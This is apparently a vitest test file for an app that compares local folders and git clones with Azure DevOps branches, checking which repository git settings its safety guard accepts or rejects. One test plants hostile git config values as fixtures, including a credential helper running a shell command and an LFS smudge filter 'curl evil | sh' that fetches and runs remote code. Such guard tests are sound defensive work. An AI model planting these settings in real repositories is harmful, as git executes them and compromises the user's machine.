import { test, expect } from 'vitest';
import { join } from 'node:path';
import { realpathSync } from 'node:fs';
import { createHandlers } from '../../src/main/ipc';
import { AuthStore } from '../../src/main/auth';
import { fakeContext } from '../../src/main/azure/fake';
import { assertSafeRepo } from '../../src/main/merge/safety';
import { compareSides } from '../../src/main/compare/compareSides';
import type { Result } from '../../src/shared/types';
import { makeOrigin, git, writeFile } from './gitFixtures';
import { tempDir, reverseCipher } from './helpers';

const ok = <T,>(r: Result<T>): T => {
  if (!r.ok) throw new Error(`${r.error.code}: ${r.error.message}`);
  return r.value;
};
const handlers = (picked: string) =>
  createHandlers({ store: new AuthStore(join(tempDir(), 'c.json'), reverseCipher), connect: async () => fakeContext(), pickFolder: async () => picked, openExternal: async () => {} });
const TARGET = { kind: 'azure' as const, project: 'Demo', repoId: 'repo1', branch: 'master' };

test('dossier téléchargé sans .git : ouvert sans erreur, comparable à une branche Azure', async () => {
  const dir = tempDir({ 'src/Service.cs': 'zip version\n', 'old.sql': 'select 1;\n' });
  const api = handlers(dir);
  ok(await api.login('https://dev.azure.com/X', 'pat'));
  ok(await api.pickFolder());
  const info = ok(await api.localRepo(dir));
  expect(info).toMatchObject({ root: realpathSync.native(dir), git: false, current: null, branches: [], remoteBranches: [] });
  const cmp = ok(await api.compare({ kind: 'local', root: info.root, ref: { type: 'worktree' } }, TARGET, 'tips'));
  expect(cmp.changes.map((c) => [c.path, c.change])).toContainEqual(['src/Service.cs', 'edit']);
  const merge = await api.mergeStart({ root: info.root, source: { type: 'branch', name: 'x' }, target: { kind: 'local', branch: 'y' } });
  expect(!merge.ok && merge.error.message).toMatch(/clone git/);
});

test('dossier téléchargé comparé à une branche d’un clone (deux dossiers différents)', async () => {
  const { clone } = makeOrigin();
  const dir = tempDir({ 'src/Service.cs': 'class Service\n{\n    int Amount = 10;\n}\n', 'extra.txt': 'x\n' });
  const cmp = await compareSides(
    null,
    { kind: 'local', root: realpathSync.native(dir), ref: { type: 'worktree' } },
    { kind: 'local', root: realpathSync.native(clone), ref: { type: 'branch', name: 'master' } },
    'mergeBase',
  );
  expect(cmp.kind).toBe('mixed');
  expect(cmp.changes.map((c) => [c.path, c.change])).toEqual([
    ['extra.txt', 'add'],
    ['README.md', 'delete'],
  ]);
});

test('clone avec Git LFS, gestionnaire d’identifiants, éditeur et pager locaux : accepté', async () => {
  const { clone } = makeOrigin();
  git(clone, 'config', 'filter.lfs.clean', 'git-lfs clean -- %f');
  git(clone, 'config', 'filter.lfs.smudge', 'git-lfs smudge -- %f');
  git(clone, 'config', 'filter.lfs.process', 'git-lfs filter-process');
  git(clone, 'config', 'filter.lfs.required', 'true');
  git(clone, 'config', 'credential.helper', 'manager');
  git(clone, 'config', 'credential.https://dev.azure.com.usehttppath', 'true');
  git(clone, 'config', 'core.editor', 'code --wait');
  git(clone, 'config', 'core.pager', 'less');
  git(clone, 'config', 'commit.gpgsign', 'true');
  await expect(assertSafeRepo(clone, 'network')).resolves.toBeUndefined();
  const api = handlers(clone);
  ok(await api.login('https://dev.azure.com/X', 'pat'));
  ok(await api.pickFolder());
  expect(ok(await api.localRepo(clone)).git).toBe(true);
});

test('les réglages réellement dangereux restent refusés, selon l’opération', async () => {
  const { clone } = makeOrigin();
  git(clone, 'config', 'credential.helper', '!touch PWN');
  await expect(assertSafeRepo(clone, 'read')).resolves.toBeUndefined(); // lecture : pas d'accès réseau
  await expect(assertSafeRepo(clone, 'network')).rejects.toBeTruthy();
  const { clone: c2 } = makeOrigin();
  git(c2, 'config', 'filter.lfs.smudge', 'curl evil | sh');
  await expect(assertSafeRepo(c2, 'read')).rejects.toBeTruthy();
});

test('dépôt appartenant à un autre utilisateur (dubious ownership) : accepté par l’app', async () => {
  const { clone } = makeOrigin();
  writeFile(clone, 'f.txt', 'x\n');
  // Simulation : safe.directory vide et propriétaire « différent » ne sont pas reproductibles sans root ;
  // on vérifie que l'app passe safe.directory pour ses propres appels.
  const { SAFE_GIT_CONFIG } = await import('../../src/main/local/safeGit');
  expect(SAFE_GIT_CONFIG).toContain('safe.directory=*');
});
